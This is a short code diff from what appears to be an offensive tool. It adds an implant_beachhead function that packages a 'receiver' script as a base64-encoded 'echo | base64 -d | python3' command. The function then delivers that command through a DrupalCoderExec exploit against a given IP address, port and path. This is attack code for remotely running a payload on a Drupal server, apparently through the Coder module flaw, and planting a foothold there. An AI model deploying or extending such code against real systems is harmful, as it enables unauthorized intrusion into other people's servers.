@@ -11,3 +11,9 @@ def package_beachhead():
         receiver = f.read()
     b64_beachhead = b64encode(receiver.encode('utf-8')).decode('utf-8')
     return "echo " + b64_beachhead + " | base64 -d | python3"
+
+def implant_beachhead(ip_addr, port, path):
+    beachhead = package_beachhead()
+    exec = DrupalCoderExec(beachhead)
+    exec.exploit(ip_addr, port, path)
+    
